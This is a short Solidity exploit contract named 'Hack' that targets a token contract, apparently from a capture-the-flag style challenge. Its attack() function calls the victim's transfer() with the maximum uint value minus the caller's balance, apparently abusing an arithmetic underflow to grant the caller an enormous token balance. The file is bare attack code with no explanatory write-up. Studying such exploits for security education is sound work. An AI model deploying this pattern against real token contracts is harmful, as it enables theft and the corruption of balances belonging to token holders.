// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;


interface IToken {
    function transfer(address _to, uint _value) external returns (bool);
    function balanceOf(address _owner) external view returns (uint balance);
}

contract Hack {

    IToken public tokenContract; 

    constructor(address _victim) { 
        tokenContract = IToken(_victim);
    }
    
    
    function attack() public payable {

        //ensuring that we receive the max of tokens possible
        tokenContract.transfer(msg.sender, type(uint).max - tokenContract.balanceOf(msg.sender));    
    }
}